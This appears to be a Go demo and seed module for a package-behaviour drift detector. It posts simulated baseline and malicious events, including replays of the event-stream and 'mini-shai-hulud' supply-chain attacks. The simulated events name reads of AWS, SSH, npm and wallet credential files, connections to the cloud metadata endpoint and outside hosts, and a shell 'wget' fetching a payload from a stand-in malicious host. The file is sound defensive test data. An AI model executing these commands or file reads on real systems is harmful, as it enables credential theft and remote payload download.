package demo

import (
	"context"
	"fmt"
	"time"

	"github.com/hi-heisenbug/goodman/internal/model"
)

// SeedProduct injects multi-service baselines and drift alerts so the
// dashboard is never empty on first open. Learning window must be short
// (demo uses MinObs=3, MinAge=1s); event timestamps span >1s so promotion
// happens without wall-clock sleeps.
func SeedProduct(ctx context.Context, c *Client) error {
	base := uint64(1_752_956_400_000_000_000) // 2025-07-20 UTC, fixed for stable demos
	ts := func(offsetMs int) uint64 { return base + uint64(offsetMs)*1_000_000 }

	type pack struct {
		service, pkg, version string
		behaviors             []string
		startMs               int
		rounds                int
	}
	baselines := []pack{
		{"web", "good-pkg", "1.0.0", []string{
			"READ /app/node_modules/good-pkg/**",
			"CONNECT 10.0.0.5:5432",
		}, 0, 12},
		{"payment-api", "axios", "1.6.0", []string{
			"CONNECT api.stripe.com:443",
			"READ /app/node_modules/axios/**",
			"CONNECT api.paypal.com:443",
		}, 2000, 12},
		{"auth-service", "jsonwebtoken", "9.0.0", []string{
			"READ /app/node_modules/jsonwebtoken/**",
			"READ /app/certs/public.crt",
		}, 5000, 12},
		{"api-gateway", "lodash", "4.17.21", []string{
			"READ /app/node_modules/lodash/**",
		}, 8000, 10},
		{"web", "express", "4.18.2", []string{
			"READ /app/node_modules/express/**",
			"CONNECT 127.0.0.1:6379",
		}, 11000, 10},
	}

	for _, p := range baselines {
		for i := 0; i < p.rounds; i++ {
			var batch []model.Attributed
			for j, b := range p.behaviors {
				batch = append(batch, attr(p.service, p.pkg, p.version, b, ts(p.startMs+i*150+j)))
			}
			if err := c.PostEvents(ctx, batch); err != nil {
				return fmt.Errorf("baseline %s@%s: %w", p.pkg, p.version, err)
			}
		}
	}

	drifts := [][]model.Attributed{
		{
			attr("web", "good-pkg", "1.0.1", "READ /app/node_modules/good-pkg/**", ts(20000)),
			attr("web", "good-pkg", "1.0.1", "CONNECT 10.0.0.5:5432", ts(20001)),
			attr("web", "good-pkg", "1.0.1", "READ /tmp/goodman-fake-secrets/credentials", ts(20002)),
			attr("web", "good-pkg", "1.0.1", "CONNECT 169.254.169.254:80", ts(20003)),
		},
		{
			attr("payment-api", "axios", "1.6.5", "CONNECT api.stripe.com:443", ts(20100)),
			attr("payment-api", "axios", "1.6.5", "READ /app/node_modules/axios/**", ts(20101)),
			attr("payment-api", "axios", "1.6.5", "READ /root/.aws/credentials", ts(20102)),
			attr("payment-api", "axios", "1.6.5", "CONNECT 45.33.32.156:443", ts(20103)),
			attr("payment-api", "axios", "1.6.5", "READ /root/.ssh/id_rsa", ts(20104)),
		},
		{
			attr("auth-service", "jsonwebtoken", "9.0.2", "READ /app/node_modules/jsonwebtoken/**", ts(20200)),
			attr("auth-service", "jsonwebtoken", "9.0.2", "EXEC /bin/sh -c wget http://malicious.example.com/payload", ts(20201)),
			attr("auth-service", "jsonwebtoken", "9.0.2", "CONNECT 169.254.169.254:80", ts(20202)),
			attr("auth-service", "jsonwebtoken", "9.0.2", "CONNECT 192.168.100.200:4444", ts(20203)),
		},
		{
			attr("api-gateway", "lodash", "4.17.22", "READ /app/node_modules/lodash/**", ts(20300)),
			attr("api-gateway", "lodash", "4.17.22", "CONNECT updates.lodash.io:443", ts(20301)),
		},
	}
	for _, batch := range drifts {
		if err := c.PostEvents(ctx, batch); err != nil {
			return fmt.Errorf("drift seed: %w", err)
		}
	}
	return nil
}

// Scenario describes a baseline-to-malicious package-version replay.
type Scenario struct {
	Service     string
	Package     string
	Baseline    VersionState
	Malicious   VersionState
	ExpectRules []string
}

// VersionState is one package version and its behaviors.
type VersionState struct {
	Version   string
	Behaviors []string
}

// EventStreamScenario returns the flatmap-stream / event-stream reproduction.
// Kept in lockstep with test/replay/scenarios/event-stream.json (enforced by test).
func EventStreamScenario() Scenario {
	return Scenario{
		Service: "payments",
		Package: "flatmap-stream",
		Baseline: VersionState{
			Version: "0.1.0",
			Behaviors: []string{
				"READ /app/node_modules/flatmap-stream/**",
				"READ /app/node_modules/event-stream/**",
			},
		},
		Malicious: VersionState{
			Version: "0.1.1",
			Behaviors: []string{
				"READ /app/node_modules/flatmap-stream/**",
				"READ /home/app/.config/Copay/wallet.dat",
				"CONNECT 104.245.39.112:443",
			},
		},
		ExpectRules: []string{"new-outbound-connect", "secret-read"},
	}
}

// SeedEventStreamBaseline learns flatmap-stream@0.1.0 so the later attack
// diffs as a version bump. Timestamps span >1s for MinAge promotion.
func SeedEventStreamBaseline(ctx context.Context, c *Client) error {
	s := EventStreamScenario()
	base := uint64(time.Now().UnixNano())
	for i := 0; i < 4; i++ {
		var batch []model.Attributed
		for j, b := range s.Baseline.Behaviors {
			batch = append(batch, attr(s.Service, s.Package, s.Baseline.Version, b,
				base+uint64(i)*400_000_000+uint64(j)*1_000_000))
		}
		if err := c.PostEvents(ctx, batch); err != nil {
			return fmt.Errorf("event-stream baseline: %w", err)
		}
	}
	return nil
}

// FireEventStreamAttack posts the malicious flatmap-stream@0.1.1 behaviors.
func FireEventStreamAttack(ctx context.Context, c *Client) error {
	s := EventStreamScenario()
	base := uint64(time.Now().UnixNano())
	var batch []model.Attributed
	for i, b := range s.Malicious.Behaviors {
		batch = append(batch, attr(s.Service, s.Package, s.Malicious.Version, b,
			base+uint64(i)*1_000_000))
	}
	if err := c.PostEvents(ctx, batch); err != nil {
		return fmt.Errorf("event-stream attack: %w", err)
	}
	return nil
}

// MiniShaiHuludScenario is the 2026 flagship replay. It stays in lockstep with
// test/replay/scenarios/mini-shai-hulud.json.
func MiniShaiHuludScenario() Scenario {
	return Scenario{
		Service: "developer-tools",
		Package: "mini-shai-hulud-loader",
		Baseline: VersionState{
			Version:   "1.0.0",
			Behaviors: []string{"READ /app/node_modules/mini-shai-hulud-loader/**"},
		},
		Malicious: VersionState{
			Version: "1.0.1",
			Behaviors: []string{
				"READ /app/node_modules/mini-shai-hulud-loader/**",
				"READ /home/app/.npmrc",
				"CONNECT 169.254.169.254:80",
				"CONNECT 203.0.113.42:443",
				"EXEC /bin/sh",
			},
		},
		ExpectRules: []string{"cloud-metadata", "new-exec", "new-outbound-connect", "secret-read"},
	}
}

func SeedMiniShaiHuludBaseline(ctx context.Context, c *Client) error {
	s := MiniShaiHuludScenario()
	base := uint64(time.Now().UnixNano())
	for i := 0; i < 4; i++ {
		var batch []model.Attributed
		for j, behavior := range s.Baseline.Behaviors {
			batch = append(batch, attr(s.Service, s.Package, s.Baseline.Version, behavior,
				base+uint64(i)*400_000_000+uint64(j)*1_000_000))
		}
		if err := c.PostEvents(ctx, batch); err != nil {
			return fmt.Errorf("mini-shai-hulud baseline: %w", err)
		}
	}
	return nil
}

func FireMiniShaiHuludAttack(ctx context.Context, c *Client) error {
	s := MiniShaiHuludScenario()
	base := uint64(time.Now().UnixNano())
	batch := make([]model.Attributed, 0, len(s.Malicious.Behaviors))
	for i, behavior := range s.Malicious.Behaviors {
		batch = append(batch, attr(s.Service, s.Package, s.Malicious.Version, behavior,
			base+uint64(i)*1_000_000))
	}
	if err := c.PostEvents(ctx, batch); err != nil {
		return fmt.Errorf("mini-shai-hulud attack: %w", err)
	}
	return nil
}
